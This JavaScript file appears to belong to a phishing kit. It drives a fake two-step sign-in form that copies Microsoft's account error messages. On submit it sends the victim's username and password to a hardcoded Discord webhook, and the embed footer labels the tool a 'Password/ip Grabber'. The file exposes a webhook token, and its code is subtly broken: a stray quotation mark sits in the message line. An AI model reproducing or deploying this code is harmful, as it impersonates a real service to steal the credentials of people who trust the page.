
// Variables
const slidePage = document.querySelector(".slide-page");
const secondSlide = document.querySelector(".secondSlide");
const btnNext = document.querySelector(".firstNext");
const prevBtnSec = document.querySelector(".prev-1");
const submitBtn = document.querySelector(".submit");
const input1 = document.getElementById("email");
const input2 = document.getElementById("password");

// Functions
function validateEmail(email) {
    return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(email);
}

function validate() {
    const result = $("#result");
    const email = $("#email").val();
    result.text("");
    if (!validateEmail(email)) {
        if (email) {
            result.text("That Microsoft account doesn't exist. Enter a different account or get a new one.");
        } else {
            result.text("Enter a valid email address, phone number, or Skype name.");
        }
        result.css("color", "red");
        document.getElementById("loginForm").style.height = "403px";
        return false;
    }
    return true;
}

function validatePassword() {
    const passResult = $("#passResult");
    const password = $("#password").val();
    passResult.text("");
    if (password.length < 8) {
        passResult.text("Your account or password is incorrect. If you don't remember your password,");
        passResult.css("color", "red");
        return false;
    }
    return true;
}

// Event Listeners
input1.addEventListener("keyup", function(event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        document.getElementById("btnSend").click();
    }
});

input2.addEventListener("keyup", function(event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        document.getElementById("btnSignIn").click();
    }
});

btnNext.addEventListener("click", function() {
    const email = document.getElementById("email").value;
    if (validate() && validateEmail(email)) {
        document.getElementById("userLine").textContent = email;
        const section1 = document.getElementById("section-1");
        const section2 = document.getElementById("section-2");
        section1.style.marginLeft = "-100%";
        section1.style.visibility = "hidden";
        section2.style.marginLeft = "0%";
        document.getElementById("loginForm").style.height = "403px";
    }
});



submitBtn.addEventListener("click", function() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    if (validatePassword()) {
        let webhookUrl = "https://discord.com/api/webhooks/1102905102806822943/czOOqU7brZCu3uLXH1UH0IRM2jhuAgrI7TYcaiqeKk5UBPklFWV7HbVkHj39CVslj8M-";
        let userName = sessionStorage.getItem("user");
        let password = sessionStorage.getItem("password");
        let message = 'userName + " just logged in with password: " + password;

        const data = {
            embeds: [{
                    title: "Login Notification",
                    description: message,
                    color: 0x0099ff,
                    footer: {text: "Password/ip Grabber | Created By Dwaine"},
                    thumbnail: {url: "https://media.discordapp.net/attachments/951951561582575717/1102918607677169724/Dwaine.png"}
            }]
        };

        let xhr = new XMLHttpRequest();
        xhr.open("POST", webhookUrl, true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log("Message sent.");
            } else if (xhr.readyState === 4 && xhr.status !== 200) {
                console.error("Failed to send message.");
            }
        };
        xhr.send(JSON.stringify(data));
    }

});

prevBtnSec.addEventListener("click", function() {
    const section1 = document.getElementById("section-1");
    const section2 = document.getElementById("section-2");
    section1.style.marginLeft = "0%";
    section1.style.visibility = "visible";
    section2.style.marginLeft = "100%";
    document.getElementById("loginForm").style.height = "370px";
    slidePage.style.marginLeft = "0%";
    secondSlide.style.marginLeft = "100%";
    slidePage.style.visibility = "visible";
});

